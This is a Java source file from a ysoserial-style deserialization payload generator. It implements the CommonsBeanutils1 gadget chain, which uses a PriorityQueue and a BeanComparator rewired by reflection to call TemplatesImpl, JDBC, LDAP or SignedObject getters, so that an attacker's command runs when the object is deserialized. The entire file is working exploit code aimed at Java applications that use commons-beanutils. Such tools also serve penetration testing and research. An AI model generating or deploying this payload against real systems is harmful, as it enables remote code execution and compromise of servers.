package cn.butler.yso.payloads;

import java.math.BigInteger;
import java.util.*;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.payloads.custom.CustomCommand;
import cn.butler.yso.payloads.util.Gadgets;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Reflections;
import org.apache.commons.beanutils.BeanComparator;

import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.FROHOFF })
public class CommonsBeanutils1 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object templates = Gadgets.createGetter(command);
		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

        // switch method called by comparator
        String property_value = "";
        if (command.startsWith(CustomCommand.GETTER_JDBC)) {
            property_value = "connection";
        }else if(command.startsWith(CustomCommand.GETTER_TEMPlATESIMPL) || command.startsWith(CustomCommand.GETTER_TEMPLATESIMPL0)){
            property_value = "outputProperties";
        }else if(command.startsWith(CustomCommand.GETTER_LDAPATTRIBUTE)){
            property_value = "attributeDefinition";
        }else if(command.startsWith(CustomCommand.GETTER_SIGNEDOBJECT)){
            property_value = "object";
        }
		Reflections.setFieldValue(comparator, "property", property_value);

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1.class, args);
	}
}
